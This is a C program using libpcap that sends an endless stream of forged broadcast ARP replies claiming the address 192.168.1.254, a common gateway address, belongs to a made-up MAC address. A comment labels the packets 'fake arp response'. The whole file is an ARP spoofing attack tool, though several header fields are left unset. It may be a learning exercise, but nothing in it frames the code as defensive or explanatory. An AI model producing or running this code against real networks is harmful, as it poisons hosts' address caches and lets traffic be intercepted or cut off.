#include <pcap.h>
#include <string.h>


struct eth_header
{
	u_int8_t ether_dhost[6];
	u_int8_t ether_shost[6];
	u_int16_t ether_type;
};

struct arp_packet
{
	u_int16_t hw_type;
	u_int16_t proto_type;
	u_int8_t hw_add_len;
	u_int8_t pro_add_len;
	u_int16_t op;
	u_int8_t ether_shost[6];
	u_int8_t ip_shost[4];
	u_int8_t ether_dhost[6];
	u_int8_t ip_dhost[4];
};

struct arp_frame
{	
	struct eth_header eth_hdr;
	struct arp_packet arp_pkt;
};



int main(int argc, char **argv)
{
	//char *dev = argv[1];
	//printf("Device: %s\n", dev);
	char *dev, errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 mask;
	bpf_u_int32 net;

	dev = pcap_lookupdev(errbuf);

	if(dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
	}
	
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Can't get netmask for device %s\n", dev);
		net = 0;
		mask = 0;
	}

	pcap_t *handle;
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL) {
		fprintf(stderr,"Couldn't open device %s", dev);
		return(2);
	}

	while(1){	
	struct arp_frame buffer;
	buffer.eth_hdr.ether_dhost[0] = 0xff;
	buffer.eth_hdr.ether_dhost[1] = 0xff;
	buffer.eth_hdr.ether_dhost[2] = 0xff;
	buffer.eth_hdr.ether_dhost[3] = 0xff;
	buffer.eth_hdr.ether_dhost[4] = 0xff;
	buffer.eth_hdr.ether_dhost[5] = 0xff;
	
	buffer.eth_hdr.ether_shost[0] = 0x0a;
	buffer.eth_hdr.ether_shost[1] = 0x0a;
	buffer.eth_hdr.ether_shost[2] = 0x0a;
	buffer.eth_hdr.ether_shost[3] = 0x0a;
	buffer.eth_hdr.ether_shost[4] = 0x0a;
	buffer.eth_hdr.ether_shost[5] = 0x0a;

	buffer.eth_hdr.ether_type = htons(0x0806);



		//send fake arp response
		//memcpy(eptr->ether_dhost, eptr->ether_shost, 6);
		buffer.arp_pkt.ether_dhost[0] = 0xff;
		buffer.arp_pkt.ether_dhost[1] = 0xff;
		buffer.arp_pkt.ether_dhost[2] = 0xff;
		buffer.arp_pkt.ether_dhost[3] = 0xff;
		buffer.arp_pkt.ether_dhost[4] = 0xff;
		buffer.arp_pkt.ether_dhost[5] = 0xff;	
		
	
		buffer.arp_pkt.op = htons(2);
		
		
		//memcpy(arpptr->ether_dhost, arpptr->ether_shost, 6);
		
		buffer.arp_pkt.ether_shost[0] = 0x11;
		buffer.arp_pkt.ether_shost[1] = 0x12;
		buffer.arp_pkt.ether_shost[2] = 0x13;
		buffer.arp_pkt.ether_shost[3] = 0x14;
		buffer.arp_pkt.ether_shost[4] = 0x15;
		buffer.arp_pkt.ether_shost[5] = 0x1a;
		buffer.arp_pkt.ip_shost[0] = 192;
		buffer.arp_pkt.ip_shost[1] = 168;
		buffer.arp_pkt.ip_shost[2] = 1;
		buffer.arp_pkt.ip_shost[3] = 254;

		pcap_sendpacket(handle, (u_char *)&buffer, sizeof(buffer));
	}
	
	pcap_close(handle);
	return 0;
}
